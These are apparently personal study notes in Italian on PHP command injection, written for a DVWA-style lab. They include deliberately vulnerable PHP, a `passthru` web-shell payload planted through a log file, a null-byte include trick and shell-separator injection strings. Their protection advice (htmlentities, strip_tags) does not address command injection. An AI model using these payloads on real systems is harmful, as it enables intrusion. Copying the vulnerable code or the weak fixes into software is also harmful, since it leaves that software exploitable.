## Command injection

- http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution ✔
- http://www.ss64.com/bash/ ✔
- http://www.ss64.com/nt/ ✔
- https://www.owasp.org/index.php/Command_Injection \#TODO

I valori inseriti dall'utente non vengono opportunamente sanitizzati.

> https://www.exploit-db.com/papers/13073

`submit.php`

```
<form method="POST" action="">
	<textarea rows="10" name="comments" cols="60"></textarea>
	<p><input type="submit" value="Post" name="sub"></p>
</form>
```

`comments.php`

```
$comments = $_POST['comments'];

$log = fopen('comments.php','a');
fwrite($log,'<br />'.'<br />.'<center>'.'Comments::'.'<br />'.$comments);
fclose($log);
```

L'input dell'utente non viene sanitizzato.
L'attaccante può sfruttare questa vulnerabilità per eseguire comandi come `phpinfo();`.

`info.php`

```
<?php
$msg = $_GET['msg'];
$ip = getenv('REMOTE_ADDR');
$error = fopen('errorlog.php','a');
fwrite($error,'<br />'.$msg.'<br />'.$ip.'<br />');
fclose($error);
?>
```

L'attaccante inserisce il codice `<? passthru($_GET['cmd']); ?>` nel file di log `errorlog.php`.
Quando il file di log viene richiesto passando col parametro `cmd` il comando `command`, quest'ultimo viene eseguito.

`http://victim.xxx/info.php?msg=<? passthru($_GET['cmd']); ?>`

`http://victim.xxx/errorlog.php?cmd=<command>`

#### Null Byte Injection

`include.php`

```
<?php
	$file = $_GET['file'];
	include('$file.php');
?>
```

L'attaccante esclude `.php` dal nome del file inserendo il terminatore `%00` nell'URL visitata.

`http://victim.xxx/include.php?file=secret.txt%00`

### Command injection - Low

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8; CMD`
	- `8.8.8.8 && CMD`
	- `8.8.8.8 & CMD`
	- `8.8.8.8 | CMD`

### Command injection - Medium

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8 & CMD`
	- `8.8.8.8 | CMD`

### Command injection - High

\#TODO http://172.17.0.2/vulnerabilities/exec/

### Command injection - Protection

Per php usare `htmlentities()`, `htmlspecialchars()`, `strip_tags()`, `stripslashes()`.

